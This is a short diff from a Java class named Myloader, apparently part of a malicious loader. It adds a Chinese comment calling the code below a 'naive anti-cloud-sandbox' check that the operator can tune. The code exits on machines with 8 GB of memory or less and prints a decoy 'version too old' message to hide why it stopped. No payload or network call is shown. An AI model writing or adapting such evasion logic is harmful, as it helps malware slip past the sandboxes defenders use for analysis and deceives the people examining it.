@@ -22,6 +22,7 @@ public class Myloader extends ClassLoader{
     }
     public static void main(String[] args){
         OperatingSystemMXBean osmb = (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
+        //如果目标小于8g就不运行了，幼稚版的防云沙箱，这个看着改，可以不要
         long cpu = (osmb.getTotalPhysicalMemorySize() / 1024/1024);
         if (cpu<=8192){
             System.out.println("版本过老，程序自动退出");
